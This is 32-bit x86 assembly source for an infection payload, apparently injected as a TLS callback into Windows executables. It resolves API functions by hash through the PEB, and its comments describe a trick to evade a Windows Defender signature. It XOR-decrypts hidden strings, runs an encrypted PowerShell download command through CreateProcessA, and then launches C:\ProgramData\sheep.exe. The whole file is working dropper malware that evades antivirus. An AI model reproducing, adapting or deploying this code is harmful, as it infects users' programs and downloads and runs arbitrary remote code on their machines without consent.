%include "infection_strings.asm"

section .text
[BITS 32]

; %define TLS

   ; this is now a TLS callback, which has the following header:
   ;
   ;    VOID (NTAPI *PIMAGE_TLS_CALLBACK)(PVOID DllHandle, DWORD Reason, PVOID Reserved)

%ifdef INFECTION_STANDALONE
global main
main:
%else
global payload32
payload32:
   dd (module_end - payload32_code)
   
payload32_code:
%endif
   
   push ebp
   mov ebp,esp
   sub esp,0x68
   push esi
   push edi
   push ebx

%ifndef INFECTION_STANDALONE
   cmp dword [ebp+0xC],1
   jnz infection__end           ; if the given Reason is DLL_PROCESS_ATTACH, do the needful
                                ; otherwise, terminate the infection.
%endif
   
   call infection__data         ; perform a call-pop to get offsets to our data
infection__data__start:         ; this prevents relocations from forming because we are not
                                ; using absolute addresses for our data, making it more portable  
infection__data__sheep:
   LAUNCH_COMMAND               ; dd str_len
   ;; db key
   ;; db string_data
infection__data__powershell:
   DOWNLOAD_COMMAND             ; dd str_len
   ;; db key
   ;; db string_data
infection__data:
   pop ebx                      ; get the pointer to the start of the data
   
   ;; allocate some space for our decrypted strings
   mov eax, [ebx+(infection__data__sheep-infection__data__start)]
   inc eax
   mov ecx, eax
   mov dword [ebp-4], 4
   xor edx,edx
   div dword [ebp-4]
   test edx,edx
   jz infection__alloc_sheep_aligned
   mov eax, [ebp-4]
   sub eax, edx
   add ecx, eax

infection__alloc_sheep_aligned:  
   sub esp, ecx
   mov [ebp-8], esp
   mov [ebp-0xC], ecx

   mov eax, [ebx+(infection__data__powershell-infection__data__start)]
   inc eax
   mov ecx, eax
   xor edx, edx
   div dword [ebp-4]
   test edx,edx
   jz infection__alloc_powershell_aligned
   mov eax, [ebp-4]
   sub eax, edx
   add ecx, eax

infection__alloc_powershell_aligned:
   sub esp, ecx
   mov [ebp-0x10], esp
   mov [ebp-0x14], ecx
   
   mov eax, 0xFFFFFFCF          ; bypass Windows Defender matching on fs:[0x30]
   inc eax                      ; I am convinced the Wacatac signature is just Microsoft telling us
   neg eax                      ; we are performing a "whack attack" and we should git gud
   mov eax, [fs:eax]            ; get current PEB (fs:0x30)
   mov ecx, [eax+0xC]           ; peb->Ldr
   mov eax, [ecx+0xC]           ; ldr->InLoadOrderModuleList.Flink (the current module)
   mov ecx, [eax]               ; list_entry->InLoadOrderLinks.Flink (ntdll.dll)
   mov eax, [ecx]               ; list_entry->InLoadOrderLinks.Flink (kernel32.dll)
   mov esi, [eax+0x18]          ; list_entry->DllBase
   push 0x71948ca4
   push esi
   call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0x71948ca4)
   mov edi, eax                 ; get function for WaitForSingleObject
   push 0x4a7c0a09
   push esi
   call get_proc_by_hash        ; get_proc_by_hash(shell32_module, 0xb0ff5bf)
   mov [ebp-4], eax             ; get function for CreateProcessA
   push 0xda1a7563
   push esi
   call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0xda1a7563)
   mov esi, eax                 ; get function for GetFileAttributesA

   xorps xmm0,xmm0              ; zero out the STARTUPINFO and PROCESS_INFORMATION structures
   movups [ebp-0x68],xmm0
   movups [ebp-0x54],xmm0
   movups [ebp-0x44],xmm0
   movups [ebp-0x34],xmm0
   movups [ebp-0x24],xmm0
   mov dword [ebp-0x58],0x44

   lea eax, [ebx+(infection__data__sheep-infection__data__start)] ; pointer to encrypted struct
   push dword [ebp-8]
   push eax
   call decrypt_string
   push dword [ebp-8]
   call esi                                                       ; GetFileAttributesA("C:\\ProgramData\\sheep.exe")
   cmp eax, 0xFFFFFFFF          ; eax != INVALID_FILE_ATTRIBUTES
   jnz infection__payload_exists

   lea eax, [ebp-0x68]
   push eax
   lea eax, [ebp-0x58]
   push eax
   push 0
   push 0
   push 0
   push 0
   push 0
   push 0
   lea eax, [ebx+(infection__data__powershell-infection__data__start)]
   push dword [ebp-0x10]
   push eax
   call decrypt_string
   push dword [ebp-0x10]
   push 0
   call [ebp-4]                 ; CreateProcessA(NULL, "powershell command", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
   test eax,eax
   jz infection__stack_cleanup  ; CreateProcessA failed

   push 0xFFFFFFFF
   push dword [ebp-0x68]
   call edi                     ; WaitForSingleObject(proc_info.hProcess, INFINITE)
   test eax,eax
   jnz infection__stack_cleanup ; WaitForSingleObject returns 0 on success

   xorps xmm0,xmm0              ; zero out the STARTUPINFO and PROCESS_INFORMATION structures again
   movups [ebp-0x68],xmm0
   movups [ebp-0x54],xmm0
   movups [ebp-0x44],xmm0
   movups [ebp-0x34],xmm0
   movups [ebp-0x24],xmm0
   mov dword [ebp-0x58],0x44

infection__payload_exists:
   lea eax, [ebp-0x68]
   push eax
   lea eax, [ebp-0x58]
   push eax
   push 0
   push 0
   push 0
   push 0
   push 0
   push 0
   push dword [ebp-8]
   push 0
   call [ebp-4]                     ; CreateProcessA(NULL, "sheep.exe", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
   
infection__stack_cleanup:
   add esp, [ebp-0xC]
   add esp, [ebp-0x14]

infection__end:   
   pop ebx
   pop edi
   pop esi
   add esp,0x68
   pop ebp

%ifdef INFECTION_TLS
   ret 0xC
%else
   ret
%endif

   ;; [ebp+8]: the string struct
   ;; [ebp+0xC]: the output address
decrypt_string:
   push ebp
   mov ebp, esp
   push esi
   push edi
   mov eax,[ebp+8]
   mov edi,[ebp+0xC]
   mov ecx,[eax]
   lea esi,[eax+5]
   mov al,[eax+4]

decrypt_loop:
   mov dl, [esi]
   xor dl, al
   mov [edi], dl
   inc esi
   inc edi
   dec ecx
   test ecx,ecx
   jnz decrypt_loop

   mov dl, [esi]
   mov byte [edi], dl
   pop edi
   pop esi
   pop ebp
   ret 8
   
   ; [ebp+4]: the dll module
   ; [ebp+8]: the 32-bit fnv321a hash value to look up
get_proc_by_hash:
   push ebp
   mov ebp,esp
   sub esp,8                    ; we need two variables on the stack, we don't have enough registers in 32-bit mode
   push ebx
   push esi
   push edi

   mov edi, [ebp+8]             ; move the dll module into edi
   mov eax, [edi+0x3c]          ; e_lfanew
   mov eax, [edi+eax+0x78]      ; nt_headers->OptionalHeader.DataDirectory[IMAGE_EXPORT_DIRECTORY] rva
   add eax, edi                 ; pointer to the export directory
   mov ebx, [eax+0x18]          ; ExportDirectory.NumberOfNames
   mov edx, [eax+0x1c]          ; ExportDirectory.AddressOfFunctions
   add edx, edi                 
   mov [ebp-4], edx             ; store the pointer to the functions array
   mov ecx, [eax+0x20]          ; ExportDirectory.AddressOfNames
   add ecx, edi
   mov [ebp+8], ecx             ; store the pointer to the address of names array
   mov edx, [eax+0x24]          ; ExportDirectory.AddressOfNameOrdinals
   add edx, edi
   mov [ebp-8], edx             ; store the pointer to the name ordinals array
   xor esi,esi                  ; index = 0
   test ebx,ebx
   jz get_proc_by_hash__return_nullptr

get_proc_by_hash__name_iter:
   mov eax, [ecx+esi*4]         ; names[i] rva
   add eax, edi
   mov edx, 0x811c9dc5

get_proc_by_hash__fnv321a:
   movzx ecx, byte [eax]        ; get the byte of the string
   test cl,cl                   ; test for null terminator
   jz get_proc_by_hash__fnv321a_break ; break on null terminator

   lea eax,[eax+1]              ; advance one byte
   xor ecx,edx                  ; hash ^= name[i]
   imul edx, ecx, 0x1000193     ; hash *= 0x1000193
   jmp short get_proc_by_hash__fnv321a

get_proc_by_hash__found_function:
   mov eax, [ebp-4]             ; get the functions array
   mov ecx, [ebp-8]             ; get the name ordinals array
   movzx ecx, word [ecx+esi*2] ; name_ordinals[name_index]
   mov eax, [eax+ecx*4]            ; functions[name_ordinals[name_index]]
   add eax, edi                    ; add the base pointer
   jmp get_proc_by_hash__epilogue

get_proc_by_hash__fnv321a_break:
   cmp edx, [ebp+0xC]           ; check if our hash matches
   jz get_proc_by_hash__found_function

   mov ecx,[ebp+8]              ; restore AddressOfNames pointer
   inc esi                      ; advance one name
   cmp esi, ebx                 ; check if we've reached the number of names in the dll
   jb get_proc_by_hash__name_iter

get_proc_by_hash__return_nullptr:
   xor eax, eax
   
get_proc_by_hash__epilogue:
   pop edi
   pop esi
   pop ebx
   add esp,8
   pop ebp
   ret 8

module_end: 
